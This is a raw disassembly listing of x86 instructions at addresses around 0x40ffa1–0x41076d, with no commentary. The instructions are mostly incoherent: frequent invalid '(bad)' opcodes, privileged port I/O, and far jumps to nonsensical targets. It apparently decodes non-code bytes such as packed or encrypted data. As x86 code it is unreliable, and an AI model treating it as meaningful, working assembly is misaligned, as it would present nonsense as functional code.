  40ffa1:	lahf   
  40ffa2:	rol    BYTE PTR [ebp-0x26],1
  40ffa5:	and    ah,ah
  40ffa7:	loopne 0x40ffb7
  40ffa9:	mov    ch,0x8b
  40ffab:	adc    edi,ebp
  40ffad:	adc    edi,0x71
  40ffb0:	shr    DWORD PTR [esi],1
  40ffb2:	push   esi
  40ffb3:	mov    bh,0xad
  40ffb5:	aas    
  40ffb6:	sub    DWORD PTR [edx-0x24],ebx
  40ffb9:	ss sbb eax,0xb6c51cb8
  40ffbf:	aaa    
  40ffc0:	dec    edx
  40ffc1:	mov    dh,0x68
  40ffc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffc4:	scas   al,BYTE PTR es:[edi]
  40ffc5:	inc    ebx
  40ffc6:	lea    edx,[edx-0x10]
  40ffc9:	data16 daa 
  40ffcb:	mov    esi,0xdce18f2b
  40ffd0:	pop    edx
  40ffd1:	xchg   ebp,eax
  40ffd2:	cs (bad) 
  40ffd5:	pop    edi
  40ffd6:	retf   0x5e63
  40ffd9:	out    dx,al
  40ffda:	clc    
  40ffdb:	fwait
  40ffdc:	(bad)
  40ffe0:	cmp    DWORD PTR ds:0xe01ee36b,0xffffffd0
  40ffe7:	adc    eax,0xf55ff050
  40ffec:	dec    eax
  40ffed:	ficom  DWORD PTR [ebp+0x5d73eec9]
  40fff3:	les    ebx,FWORD PTR [edi]
  40fff5:	add    al,0xa3
  40fff7:	or     al,0x30
  40fff9:	mov    WORD PTR [edi-0x5f],gs
  40fffc:	and    BYTE PTR [ecx],bl
  40fffe:	popf   
  40ffff:	pop    ss
  410000:	(bad)  
  410001:	retf   
  410002:	in     eax,0x74
  410004:	(bad)  
  410006:	stos   DWORD PTR es:[edi],eax
  410007:	(bad)  
  410008:	sbb    cl,al
  41000a:	add    cl,dh
  41000c:	retf   0x45c3
  41000f:	jmp    0xe076:0x76f6d81
  410016:	push   esp
  410017:	cmp    ebx,0x6a
  41001a:	and    dl,BYTE PTR [edx]
  41001c:	pop    ebx
  41001d:	add    al,0xae
  41001f:	adc    eax,0x22328421
  410024:	fistp  DWORD PTR [eax-0x546cbb52]
  41002a:	push   ebx
  41002b:	xor    eax,DWORD PTR ds:0xc068d6d
  410031:	add    al,0x59
  410033:	out    0xea,al
  410035:	dec    edi
  410036:	sbb    ebp,DWORD PTR [esi+0x46a8e334]
  41003c:	ja     0x410031
  41003e:	mov    al,0x1a
  410040:	jl     0x40ffd7
  410042:	repz fld st(1)
  410045:	not    DWORD PTR [ebx]
  410047:	inc    edx
  410048:	mov    bh,0x9
  41004a:	ret    0x202e
  41004d:	lods   eax,DWORD PTR ds:[esi]
  41004e:	mov    dl,0x1d
  410050:	mov    ch,0xbd
  410052:	pop    edx
  410053:	cwde   
  410054:	aad    0x56
  410056:	fidiv  WORD PTR [ecx]
  410058:	repnz test bh,ah
  41005b:	rcr    DWORD PTR [ecx+ebp*1+0x5b],cl
  41005f:	or     edx,DWORD PTR [edx]
  410061:	fist   WORD PTR [ebp+0x16]
  410064:	xchg   esi,eax
  410065:	mov    esi,0x5ad89e43
  41006a:	fdivr  DWORD PTR [ecx]
  41006c:	inc    esp
  41006d:	(bad)  
  41006e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41006f:	pop    ss
  410070:	call   FWORD PTR [ecx]
  410072:	loope  0x4100f2
  410074:	aad    0xb3
  410076:	add    eax,0xb0e0daff
  41007b:	cli    
  41007c:	outs   dx,DWORD PTR ds:[esi]
  41007d:	(bad)  
  41007e:	mov    ch,0x55
  410080:	js     0x41000a
  410082:	inc    esp
  410083:	mov    dl,BYTE PTR [eax+0x7]
  410086:	jns    0x4100d0
  410088:	test   edi,ebp
  41008a:	mov    ecx,0xb7c995ad
  41008f:	inc    edx
  410090:	(bad)  
  410091:	nop
  410092:	xchg   esi,eax
  410093:	push   0xf164b5ac
  410098:	mov    ds:0x883d71df,al
  41009d:	push   ds
  41009e:	xor    eax,0x8b776607
  4100a3:	out    dx,eax
  4100a4:	mov    dh,0x13
  4100a6:	cli    
  4100a7:	pop    ss
  4100a8:	pop    ebp
  4100a9:	dec    edi
  4100aa:	xor    ecx,ebx
  4100ac:	imul   esi,DWORD PTR [ebx+0x515f4379],0x75
  4100b3:	sti    
  4100b4:	cs cli 
  4100b6:	mov    WORD PTR [ebp-0x77],cs
  4100b9:	dec    esi
  4100ba:	mov    esp,0x31169e04
  4100bf:	jp     0x410043
  4100c1:	imul   ebp,DWORD PTR [ecx],0xffffffa7
  4100c4:	ins    BYTE PTR es:[edi],dx
  4100c5:	iret   
  4100c6:	jb     0x410141
  4100c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100c9:	sbb    BYTE PTR ds:0xaf52cef7,ah
  4100cf:	call   0x39310046
  4100d4:	hlt    
  4100d5:	cmp    eax,0x390e0d1e
  4100da:	add    ecx,DWORD PTR [esi-0x1abb4fe]
  4100e0:	sbb    edi,DWORD PTR [edi+0x37]
  4100e3:	push   ss
  4100e4:	xor    al,0x76
  4100e6:	push   edx
  4100e7:	cmp    BYTE PTR [ebx-0x4bd7aafc],0x28
  4100ee:	inc    eax
  4100ef:	shl    BYTE PTR [edx],1
  4100f1:	and    BYTE PTR [ebp+0x1a5ae3],bh
  4100f7:	push   ecx
  4100f8:	enter  0xc582,0x2c
  4100fc:	(bad)  
  4100fd:	bound  eax,QWORD PTR [edx-0x39]
  410100:	dec    ebp
  410101:	or     DWORD PTR [edi+0x1afa79fa],esi
  410107:	xchg   ebp,eax
  410108:	mov    bh,0xec
  41010a:	int3   
  41010b:	and    bh,dh
  41010d:	js     0x41015a
  41010f:	out    dx,al
  410110:	fcmove st,st(7)
  410112:	shld   DWORD PTR ds:0x858a2c80,edi,cl
  410119:	imul   edi,DWORD PTR [edx],0xda7cc492
  41011f:	ret    
  410120:	push   ss
  410121:	fld    QWORD PTR [edx-0x57]
  410124:	lods   eax,DWORD PTR ds:[esi]
  410125:	xchg   ecx,eax
  410126:	sbb    edi,ebp
  410128:	mov    dh,0xf5
  41012a:	inc    esi
  41012b:	mov    dh,0xee
  41012d:	add    al,BYTE PTR [esi-0xad1132d]
  410133:	pop    esp
  410134:	clc    
  410135:	jp     0x410198
  410137:	sti    
  410138:	ds int3 
  41013a:	push   0x2e7f27e3
  41013f:	out    0xf1,al
  410141:	dec    ebp
  410142:	gs adc edx,0xdfdfaef4
  410149:	stos   DWORD PTR es:[edi],eax
  41014a:	xor    BYTE PTR [edi+0x13847700],dh
  410150:	xlat   BYTE PTR ds:[ebx]
  410151:	dec    edi
  410152:	pop    ebp
  410153:	enter  0x5390,0x62
  410157:	and    eax,0xd6bcef91
  41015c:	cli    
  41015d:	into   
  41015e:	mov    edi,0x6130ac57
  410163:	mov    ah,0xe
  410165:	ret    0xca23
  410168:	and    al,0x92
  41016a:	test   al,0x83
  41016c:	and    al,0xf8
  41016e:	popa   
  41016f:	outs   dx,DWORD PTR ds:[esi]
  410170:	xchg   esi,eax
  410171:	test   eax,0xcc14a2dc
  410176:	jg     0x410162
  410178:	cdq    
  410179:	cmp    DWORD PTR [eax-0x35],edx
  41017c:	jo     0x4101c6
  41017e:	adc    al,0x6a
  410180:	icebp  
  410181:	push   ebx
  410182:	push   eax
  410183:	jno    0x410134
  410185:	icebp  
  410186:	mov    ah,ch
  410188:	cmp    al,0xfd
  41018a:	test   DWORD PTR [ebx+esi*8-0x65aedf70],ebx
  410191:	inc    edi
  410192:	inc    edi
  410193:	call   0x1aea:0x5393eb72
  41019a:	xchg   ebx,eax
  41019b:	dec    esi
  41019c:	adc    esp,DWORD PTR [ebx-0x6a1683c9]
  4101a2:	dec    ebp
  4101a3:	inc    esi
  4101a4:	mov    dl,BYTE PTR [ecx]
  4101a6:	lock outs dx,BYTE PTR ds:[esi]
  4101a8:	mov    al,0xd4
  4101aa:	sbb    eax,DWORD PTR [ebp+0x6f895bbc]
  4101b0:	mov    eax,0x80674c8d
  4101b5:	fwait
  4101b6:	dec    ebp
  4101b7:	scas   eax,DWORD PTR es:[edi]
  4101b8:	mov    esp,0xdb73cb75
  4101bd:	repz push esi
  4101bf:	leave  
  4101c0:	inc    edx
  4101c1:	mov    esp,0xc8dc5b32
  4101c6:	icebp  
  4101c7:	pop    ecx
  4101c8:	(bad)  
  4101ca:	xor    al,0x4a
  4101cc:	mov    bh,BYTE PTR [esi-0x6319c539]
  4101d2:	xchg   edi,eax
  4101d3:	adc    bh,BYTE PTR [edi+0x53]
  4101d6:	leave  
  4101d7:	dec    ebp
  4101d8:	into   
  4101d9:	xor    esp,DWORD PTR [esi+0x11]
  4101dc:	stos   BYTE PTR es:[edi],al
  4101dd:	test   eax,0xf7aec0c3
  4101e2:	push   ebp
  4101e3:	ss xchg ebp,eax
  4101e5:	inc    edi
  4101e6:	add    dh,bl
  4101e8:	out    dx,eax
  4101e9:	ds int3 
  4101eb:	jp     0x410267
  4101ed:	cmp    bh,BYTE PTR ds:0x2aa1b18
  4101f3:	pop    esp
  4101f4:	or     ebx,DWORD PTR [ebx]
  4101f6:	test   BYTE PTR [ebx+0xdc40180],bh
  4101fc:	aaa    
  4101fd:	popf   
  4101fe:	mov    dh,0x11
  410200:	int3   
  410201:	clc    
  410202:	(bad)  [eax+0x7b]
  410205:	clc    
  410206:	xchg   ecx,eax
  410207:	cmp    eax,0x4f07799
  41020c:	sahf   
  41020d:	ins    DWORD PTR es:[edi],dx
  41020e:	dec    eax
  41020f:	fidiv  WORD PTR [esi+0x75]
  410212:	popf   
  410213:	jecxz  0x410234
  410215:	and    edx,DWORD PTR [edi-0x7418477f]
  41021b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41021c:	call   0x323770e7
  410221:	sbb    BYTE PTR [edi],0x62
  410224:	clc    
  410225:	ins    BYTE PTR es:[edi],dx
  410226:	cmp    DWORD PTR [ecx],0x76
  410229:	xchg   ebx,eax
  41022a:	dec    ecx
  41022b:	xchg   ecx,eax
  41022c:	and    al,0x4d
  41022e:	scas   al,BYTE PTR es:[edi]
  41022f:	outs   dx,DWORD PTR ds:[esi]
  410230:	and    dh,dl
  410232:	pop    ebp
  410233:	mov    ch,BYTE PTR [ecx+0x6449d1e3]
  410239:	xchg   ebp,eax
  41023a:	push   ds
  41023b:	aas    
  41023c:	ss sub al,0x26
  41023f:	icebp  
  410240:	sahf   
  410241:	cmp    BYTE PTR [ecx],ch
  410243:	or     BYTE PTR [esi+0x5b7fbfa5],al
  410249:	arpl   WORD PTR [esi],bx
  41024b:	test   al,0x5d
  41024d:	mov    ebp,0x6614486c
  410252:	addr16 cli 
  410254:	sbb    edx,ebx
  410256:	xchg   BYTE PTR [edi-0x1e],cl
  410259:	push   ds
  41025a:	mov    ecx,0x3faa172b
  41025f:	cli    
  410260:	(bad)  
  410261:	and    cl,BYTE PTR [eax]
  410263:	ja     0x410226
  410265:	aas    
  410266:	pushf  
  410267:	push   ss
  410268:	mov    cl,ch
  41026a:	(bad)  
  41026b:	cld    
  41026c:	push   ebx
  41026d:	adc    BYTE PTR [esi+eax*1-0x73e20c27],bh
  410274:	scas   al,BYTE PTR es:[edi]
  410275:	pop    edx
  410276:	or     eax,0x7f136e69
  41027b:	mov    dl,0x9e
  41027d:	cmp    cl,ch
  41027f:	mov    ecx,0x352110bf
  410284:	sub    esi,DWORD PTR [edx+edx*4-0x514f2098]
  41028b:	or     edx,DWORD PTR [eax+0x5931a64]
  410291:	jge    0x4102fd
  410293:	push   0x72
  410295:	add    al,0xc
  410297:	fwait
  410298:	outs   dx,BYTE PTR ds:[esi]
  410299:	pushf  
  41029a:	cwde   
  41029b:	aaa    
  41029c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41029d:	mov    edx,0x505038d8
  4102a2:	and    esi,eax
  4102a4:	jecxz  0x410278
  4102a6:	mov    ebp,0xb97dfe55
  4102ab:	xchg   ecx,eax
  4102ac:	stos   BYTE PTR es:[edi],al
  4102ad:	in     eax,0xa9
  4102af:	fist   WORD PTR [esp+esi*8+0x680ced2b]
  4102b6:	(bad)  
  4102b7:	je     0x4102e4
  4102b9:	jmp    0xfa96:0xd80706c8
  4102c0:	mov    al,BYTE PTR [edx-0x1eedfa10]
  4102c6:	repz adc bl,0x48
  4102ca:	test   al,0xb9
  4102cc:	or     DWORD PTR [ebp+0x7122af9d],edx
  4102d2:	or     cl,BYTE PTR [eax]
  4102d4:	ror    bh,1
  4102d6:	ror    BYTE PTR ds:0x3435f16d,0xac
  4102dd:	test   bh,0x4f
  4102e0:	adc    al,0xc4
  4102e2:	add    ebp,edx
  4102e4:	sti    
  4102e5:	xor    al,0x0
  4102e7:	cli    
  4102e8:	in     al,0x7b
  4102ea:	cdq    
  4102eb:	inc    ebp
  4102ec:	cmp    BYTE PTR [esi+0x17696c0c],ah
  4102f2:	sub    eax,0x5c5dfc2e
  4102f7:	push   edi
  4102f8:	stos   BYTE PTR es:[edi],al
  4102f9:	pop    ss
  4102fa:	sbb    edi,DWORD PTR [edi]
  4102fc:	cli    
  4102fd:	or     BYTE PTR [esi+0x4a],ah
  410300:	(bad)  
  410301:	xchg   ebx,eax
  410302:	out    dx,al
  410303:	rol    edi,0x82
  410306:	pop    edx
  410307:	mov    bl,BYTE PTR [eax+0x5edc4c39]
  41030d:	inc    eax
  41030e:	js     0x41029e
  410310:	daa    
  410311:	push   esi
  410312:	lahf   
  410313:	test   BYTE PTR [ecx],0x28
  410316:	ror    BYTE PTR [ecx-0x34df0f54],0xcd
  41031d:	xchg   ecx,eax
  41031e:	adc    eax,0x4469fdbe
  410323:	sti    
  410324:	stos   BYTE PTR es:[edi],al
  410325:	jb     0x4102f9
  410327:	sub    ecx,DWORD PTR [edx-0x55470ed6]
  41032d:	push   ss
  41032e:	mov    ecx,0x8fc90864
  410333:	mov    esi,DWORD PTR [ebp+0x2f6366e8]
  410339:	jmp    0x7b40:0xf165c86
  410340:	test   edi,ecx
  410342:	icebp  
  410343:	cli    
  410344:	repz or DWORD PTR [esi],ecx
  410347:	(bad)  
  410348:	jmp    0x9e820d2
  41034d:	mov    bl,0x46
  41034f:	xor    eax,0xd890b835
  410354:	and    al,0xab
  410356:	push   ebp
  410357:	ret    0xc47
  41035a:	das    
  41035b:	loop   0x410317
  41035d:	dec    ebx
  41035e:	cmp    ch,BYTE PTR [edi+ebp*4-0x5b4e6965]
  410365:	xchg   edi,eax
  410366:	cmp    DWORD PTR [ebx+0x35ca3ee7],ebp
  41036c:	addr16 in al,dx
  41036e:	lahf   
  41036f:	out    0x9c,al
  410371:	(bad)  
  410373:	pop    ecx
  410374:	imul   ebx,DWORD PTR [edi],0xbf96d28e
  41037a:	xor    BYTE PTR [eax],bh
  41037c:	jg     0x410361
  41037e:	jge    0x4103db
  410380:	add    BYTE PTR [eax+0x23],ah
  410383:	das    
  410384:	jae    0x41031e
  410386:	je     0x410312
  410388:	(bad)  
  410389:	and    al,0x53
  41038b:	in     eax,dx
  41038c:	in     eax,0xaa
  41038e:	push   edi
  41038f:	sub    eax,0x39efe9c6
  410394:	adc    edx,DWORD PTR [edx+0x31213df9]
  41039a:	ficom  DWORD PTR [eax-0x2809d827]
  4103a0:	xlat   BYTE PTR ds:[ebx]
  4103a1:	hlt    
  4103a2:	(bad)  
  4103a3:	xor    al,0xa
  4103a5:	push   ebp
  4103a6:	das    
  4103a7:	fcomp  QWORD PTR [esi-0x37]
  4103aa:	dec    ecx
  4103ab:	push   DWORD PTR [esi-0x3df92acc]
  4103b1:	jae    0x4103e6
  4103b3:	daa    
  4103b4:	inc    ebp
  4103b5:	xor    eax,0x4511fc47
  4103ba:	mov    esp,0xd1a27d4c
  4103bf:	loopne 0x4103bf
  4103c1:	stos   DWORD PTR es:[edi],eax
  4103c2:	out    dx,al
  4103c3:	mov    dh,0x18
  4103c5:	mov    fs,ecx
  4103c7:	adc    DWORD PTR [ecx],eax
  4103c9:	or     dh,dh
  4103cb:	jge    0x410375
  4103cd:	push   esi
  4103ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103cf:	leave  
  4103d0:	mov    DWORD PTR [edi],esp
  4103d2:	imul   esi,DWORD PTR [ecx+0x40726827],0x28
  4103d9:	sub    ebp,DWORD PTR [esi-0x4234928f]
  4103df:	outs   dx,DWORD PTR ds:[esi]
  4103e0:	push   edx
  4103e1:	push   edi
  4103e2:	addr16 mov esp,0x13b078d9
  4103e8:	hlt    
  4103e9:	popf   
  4103ea:	fcmovu st,st(4)
  4103ec:	mov    esi,0xd1c8f22f
  4103f1:	xor    al,0x1e
  4103f3:	jbe    0x41044e
  4103f5:	push   edx
  4103f6:	gs xor esi,ecx
  4103f9:	loop   0x4103c7
  4103fb:	jnp    0x4103c6
  4103fd:	xor    BYTE PTR [ebx-0x542a8f2f],ah
  410403:	pop    esi
  410404:	xor    ah,cl
  410406:	pop    es
  410407:	sbb    DWORD PTR [esi+0x7c9f69c5],0xffffffbe
  41040e:	(bad)  
  41040f:	sbb    edx,DWORD PTR [edi]
  410411:	mov    cs,WORD PTR [esi+0x68]
  410414:	mul    ah
  410416:	xor    eax,0xdf73d8e6
  41041b:	xor    BYTE PTR [ecx],0xa3
  41041e:	scas   al,BYTE PTR es:[edi]
  41041f:	xchg   ecx,eax
  410420:	adc    ah,BYTE PTR [ebx-0x24]
  410423:	cwde   
  410424:	dec    edx
  410425:	or     al,0x9f
  410427:	cmp    eax,0x2afac5e1
  41042c:	xor    BYTE PTR [esi-0x50],dh
  41042f:	mov    WORD PTR [ebx-0x6f],gs
  410432:	inc    edi
  410433:	mov    edi,0xe47554e9
  410438:	mov    dh,BYTE PTR [ebp+0x3f]
  41043b:	pop    ebp
  41043c:	jbe    0x4103d2
  41043e:	xor    al,0x23
  410440:	scas   al,BYTE PTR es:[edi]
  410441:	mov    ebp,0xf4a42485
  410446:	aaa    
  410447:	mov    al,ds:0x65f9122f
  41044c:	and    ah,0x23
  41044f:	test   ah,0xad
  410452:	sbb    eax,0xb0c5584b
  410457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410458:	pextrw ebp,(bad),0xc5
  41045a:	test   eax,0xe284c995
  41045f:	imul   esp,DWORD PTR [edi],0x44e2c1ff
  410465:	xchg   edi,eax
  410466:	sbb    eax,0xe2e1b83a
  41046b:	pop    esp
  41046c:	mov    DWORD PTR [edi+0x3c],ecx
  41046f:	mov    ecx,0x9023a1b6
  410474:	pushf  
  410475:	push   0x43
  410477:	xor    eax,0xb3b5e3a5
  41047c:	into   
  41047d:	mov    esi,0xe84e9c32
  410482:	daa    
  410483:	sbb    esp,ebp
  410485:	test   bh,0xfb
  410488:	push   ss
  410489:	adc    BYTE PTR [edx+ebp*2],ah
  41048c:	into   
  41048d:	fdiv   st(6),st
  41048f:	outs   dx,BYTE PTR ds:[esi]
  410490:	cs push ebx
  410492:	imul   ebp,DWORD PTR [ebp-0x337fd36c],0x73
  410499:	mov    bh,0xc8
  41049b:	fmul   DWORD PTR [edi+0x2c440223]
  4104a1:	jl     0x410496
  4104a3:	cli    
  4104a4:	dec    edi
  4104a5:	push   cs
  4104a6:	jg     0x410521
  4104a8:	clc    
  4104a9:	inc    edx
  4104aa:	jno    0x4104d3
  4104ac:	adc    eax,0x4cb4e21c
  4104b1:	or     BYTE PTR [esi],bh
  4104b3:	xor    eax,edi
  4104b5:	dec    ecx
  4104b6:	dec    ecx
  4104b7:	dec    ebx
  4104b8:	jg     0x410462
  4104ba:	shl    dl,1
  4104bc:	mov    ds:0xa74e11a1,al
  4104c1:	xchg   ebx,eax
  4104c2:	jns    0x4104ee
  4104c4:	dec    edi
  4104c5:	les    ebx,FWORD PTR ds:0xd37e99e3
  4104cb:	cmp    dl,ah
  4104cd:	push   cs
  4104ce:	xor    edi,esp
  4104d0:	pop    ecx
  4104d1:	ds xchg esp,eax
  4104d3:	add    ecx,esp
  4104d5:	and    ecx,esp
  4104d7:	pop    esp
  4104d8:	fs jmp 0xde70:0xac6ffea7
  4104e0:	cdq    
  4104e1:	push   cs
  4104e2:	mov    bl,0x48
  4104e4:	shr    BYTE PTR [eax],cl
  4104e6:	jns    0x4104f4
  4104e8:	fst    QWORD PTR [ecx]
  4104ea:	fld    DWORD PTR [edi+ebp*1-0x2988d3c2]
  4104f1:	test   DWORD PTR [esi-0x43],0x63e9d40
  4104f8:	jae    0x410573
  4104fa:	and    bl,bh
  4104fc:	out    dx,al
  4104fd:	pop    ss
  4104fe:	lods   eax,DWORD PTR ds:[esi]
  4104ff:	rcl    BYTE PTR [edi+eax*2+0x36d87939],0x97
  410507:	pop    ds
  410508:	stos   DWORD PTR es:[edi],eax
  410509:	sub    DWORD PTR [eax],ebp
  41050b:	pop    esp
  41050c:	jbe    0x41058c
  41050e:	inc    eax
  41050f:	mov    eax,ds:0xa344c43a
  410514:	dec    esp
  410515:	push   ecx
  410516:	dec    edi
  410517:	retf   0xbbfd
  41051a:	(bad)  
  41051b:	adc    edx,ebp
  41051d:	push   cs
  41051e:	jnp    0x410528
  410520:	les    ebp,FWORD PTR [eax+0x32]
  410523:	and    eax,0x9e13ab94
  410528:	push   0x9dc18ac5
  41052d:	pop    ebx
  41052e:	mov    ds:0x1ef182fa,al
  410533:	dec    ecx
  410534:	jb     0x4104c0
  410536:	imul   edi,DWORD PTR [ebx-0x3b],0x7c
  41053a:	sbb    al,BYTE PTR [ebp-0x4a04334e]
  410540:	or     eax,DWORD PTR [ecx]
  410542:	add    bl,BYTE PTR [ebx]
  410544:	cmp    ebp,eax
  410546:	add    BYTE PTR [edx+0xec541b5],ah
  41054c:	test   al,0xaa
  41054e:	popf   
  41054f:	(bad)  
  410550:	mov    esp,0x34d8db41
  410555:	xchg   esp,eax
  410556:	add    DWORD PTR [edx+ebp*8-0x7fb51198],eax
  41055d:	xor    bl,BYTE PTR [edx-0x52d7902f]
  410563:	jmp    0x4105ab
  410565:	sar    dh,1
  410567:	int    0x12
  410569:	loopne 0x4105c8
  41056b:	xchg   esp,eax
  41056c:	je     0x410575
  41056e:	clc    
  41056f:	sub    al,0x8f
  410571:	fistp  DWORD PTR [eax+0x182b844]
  410577:	pop    esi
  410578:	pop    ebx
  410579:	cdq    
  41057a:	jnp    0x410589
  41057c:	fdiv   DWORD PTR [ecx-0x50]
  41057f:	arpl   WORD PTR [ebx],di
  410581:	fwait
  410582:	cdq    
  410583:	sub    eax,0x1e99a9f9
  410588:	ja     0x410529
  41058a:	mov    dl,0xb1
  41058c:	pop    edx
  41058d:	xchg   edi,eax
  41058e:	pop    ecx
  41058f:	lahf   
  410590:	pop    edx
  410591:	lahf   
  410592:	dec    esi
  410593:	mov    ds:0xc101cf94,al
  410598:	push   edx
  410599:	aam    0x2d
  41059b:	push   edx
  41059c:	and    eax,0x54810c06
  4105a1:	inc    esi
  4105a2:	fisub  WORD PTR [edi+0x2e]
  4105a5:	cs pop edi
  4105a7:	mov    bl,0xbf
  4105a9:	or     BYTE PTR [esi-0x58],ch
  4105ac:	mov    ch,0x45
  4105ae:	dec    esi
  4105af:	dec    esp
  4105b0:	mov    eax,ds:0xdbbcd403
  4105b5:	iret   
  4105b6:	jo     0x41060b
  4105b8:	dec    ecx
  4105b9:	dec    ebp
  4105ba:	scas   eax,DWORD PTR es:[edi]
  4105bb:	retf   
  4105bc:	or     DWORD PTR [edi-0xe],esi
  4105bf:	sub    edx,DWORD PTR [eax-0x99dde26]
  4105c5:	jnp    0x410637
  4105c7:	inc    esp
  4105c8:	sbb    ecx,DWORD PTR [edx+0x72]
  4105cb:	dec    ebx
  4105cc:	cmc    
  4105cd:	enter  0x28e1,0xaa
  4105d1:	outs   dx,DWORD PTR ds:[esi]
  4105d2:	loope  0x410606
  4105d4:	test   DWORD PTR [ebp+0x73],eax
  4105d7:	add    eax,0x1faeb264
  4105dc:	cmp    DWORD PTR [esi+ebx*8],edi
  4105df:	sbb    eax,0x3302e7b1
  4105e4:	ss jge 0x41058d
  4105e7:	dec    eax
  4105e8:	sbb    BYTE PTR [edx+esi*4+0x54],ah
  4105ec:	mov    edi,gs
  4105ee:	mov    cl,0xc8
  4105f0:	inc    DWORD PTR [esi+0x7d21e8cb]
  4105f6:	jle    0x4105a7
  4105f8:	cs jae 0x4105f3
  4105fb:	xchg   edi,eax
  4105fc:	pushf  
  4105fd:	fsubr  QWORD PTR [edx]
  4105ff:	adc    al,0x7a
  410601:	jle    0x4105d4
  410603:	popf   
  410604:	pop    esi
  410605:	daa    
  410606:	mov    ds:0x99313b65,al
  41060b:	les    edi,FWORD PTR [esi+0x6d]
  41060e:	pop    edi
  41060f:	xchg   ebp,eax
  410610:	repz jge 0x41068c
  410613:	push   es
  410614:	(bad)  
  410615:	std    
  410616:	mov    ch,BYTE PTR [ecx-0x3881ef66]
  41061c:	mov    al,BYTE PTR [eax]
  41061e:	(bad)  
  410620:	push   ebx
  410621:	jmp    0x410637
  410623:	popf   
  410624:	sbb    ah,bl
  410626:	xchg   DWORD PTR [ecx+0x12c37da0],ebp
  41062c:	xchg   ecx,eax
  41062d:	jle    0x4105bb
  41062f:	xchg   esi,eax
  410630:	jecxz  0x4105d3
  410632:	dec    eax
  410633:	jae    0x4105e4
  410635:	nop
  410636:	inc    edx
  410637:	arpl   WORD PTR [edi+ebp*1+0x74bebd4f],si
  41063e:	mov    eax,ds:0x923b7d32
  410643:	push   ds
  410644:	mov    DWORD PTR [edx+0x5e210b9b],edx
  41064a:	daa    
  41064b:	dec    ebx
  41064c:	das    
  41064d:	das    
  41064e:	or     DWORD PTR [edx],0x6
  410651:	xchg   ecx,eax
  410652:	cld    
  410653:	adc    ch,BYTE PTR ds:0xa4c5426e
  410659:	ss stos DWORD PTR es:[edi],eax
  41065b:	and    BYTE PTR [ebx],ah
  41065d:	dec    edx
  41065e:	sbb    DWORD PTR [edi-0x73],ebp
  410661:	push   esi
  410662:	jo     0x4105e9
  410664:	iret   
  410665:	sahf   
  410666:	aam    0x3b
  410668:	mov    ch,0x70
  41066a:	xor    ecx,DWORD PTR [edi+0x189f4de6]
  410670:	popf   
  410671:	popf   
  410672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410673:	or     DWORD PTR [esi-0x27f8fee9],0xc77fe652
  41067d:	nop
  41067e:	daa    
  41067f:	mov    ch,0xc8
  410681:	mov    dl,BYTE PTR [eax]
  410683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410684:	jp     0x410657
  410686:	push   ebx
  410687:	(bad)  
  410688:	xchg   ebx,eax
  410689:	cs and eax,0x4eeeee5
  41068f:	xchg   ebx,eax
  410690:	sub    DWORD PTR [ecx+0x4e],eax
  410693:	dec    edi
  410694:	mov    dl,0x66
  410696:	call   0xfa7516e9
  41069b:	loopne 0x4106d8
  41069d:	(bad)  
  41069e:	data16 in al,dx
  4106a0:	xor    eax,DWORD PTR [edx]
  4106a2:	mov    DWORD PTR [eax+0x46],ebx
  4106a5:	outs   dx,BYTE PTR ds:[esi]
  4106a6:	mov    dl,dl
  4106a8:	fcmovbe st,st(2)
  4106aa:	mov    edx,0xc43b1f5a
  4106af:	pop    edx
  4106b0:	lods   al,BYTE PTR ds:[esi]
  4106b1:	std    
  4106b2:	fwait
  4106b3:	sub    esp,0xb7583264
  4106b9:	pop    ss
  4106ba:	aaa    
  4106bb:	repz ds ds mov eax,0x37f29caf
  4106c3:	sahf   
  4106c4:	in     al,0xab
  4106c6:	loopne 0x41073d
  4106c8:	sub    eax,0x84434c5c
  4106cd:	fidiv  WORD PTR [edx-0x3e]
  4106d0:	or     eax,0x9c1332cd
  4106d5:	xchg   ebp,eax
  4106d6:	add    al,BYTE PTR [esi]
  4106d8:	gs aad 0x1d
  4106db:	or     BYTE PTR [esi+esi*4],bl
  4106de:	inc    esi
  4106df:	xor    eax,0xfeef0097
  4106e4:	(bad)
  4106e7:	call   0xefa3:0x846826a6
  4106ee:	sbb    eax,0xf4aea9c5
  4106f3:	mov    ebx,0x54c58c76
  4106f8:	out    dx,al
  4106f9:	sub    dl,cl
  4106fb:	cmp    al,BYTE PTR [eax+0x6c68e88a]
  410701:	push   cs
  410702:	sub    DWORD PTR [edx+0x27],ebx
  410705:	inc    eax
  410706:	ins    BYTE PTR es:[edi],dx
  410707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410708:	inc    edx
  410709:	push   ds
  41070a:	mov    ebx,0xca39244
  41070f:	ins    BYTE PTR es:[edi],dx
  410710:	loopne 0x4106bc
  410712:	aad    0x6c
  410714:	fisttp QWORD PTR [edi+0x7]
  410717:	jo     0x410776
  410719:	(bad)  
  41071b:	sbb    eax,0xa59bb061
  410720:	daa    
  410721:	lea    ecx,[ebx-0x21]
  410724:	pop    ss
  410725:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410726:	sub    bl,bh
  410728:	ror    ebx,1
  41072a:	ret    
  41072b:	and    al,0xa4
  41072d:	mov    ds:0xe0cdd68d,eax
  410732:	jl     0x4106fb
  410734:	repz repnz test BYTE PTR [edx-0x5b],bh
  410739:	mov    cl,0xdc
  41073b:	jne    0x41077d
  41073d:	(bad)  
  41073e:	mov    eax,0x8309bb1f
  410743:	icebp  
  410744:	jb     0x4106f4
  410746:	dec    ebx
  410747:	mov    ds:0xa47ab10d,al
  41074c:	fcomip st,st(7)
  41074e:	stos   DWORD PTR es:[edi],eax
  41074f:	push   0xffffffc2
  410751:	mov    ds,WORD PTR [eax+0x1f569778]
  410757:	retf   
  410758:	nop
  410759:	and    eax,0x52de9a03
  41075e:	push   es
  41075f:	int3   
  410760:	sbb    esi,DWORD PTR [ecx]
  410762:	adc    ecx,DWORD PTR [esi-0x2b56f1a6]
  410768:	xor    eax,0x6b52131f
  41076d:	push   esp
